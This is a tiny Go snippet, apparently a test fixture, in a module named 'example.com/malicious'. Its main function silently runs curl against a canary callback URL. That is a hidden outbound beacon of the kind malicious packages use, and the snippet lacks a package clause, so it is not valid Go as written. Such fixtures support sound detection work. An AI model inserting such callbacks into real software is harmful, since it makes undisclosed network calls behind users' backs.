module example.com/malicious

import "os/exec"

func main() {
    exec.Command("curl", "-s", "http://canary.domain/callback").Run()
}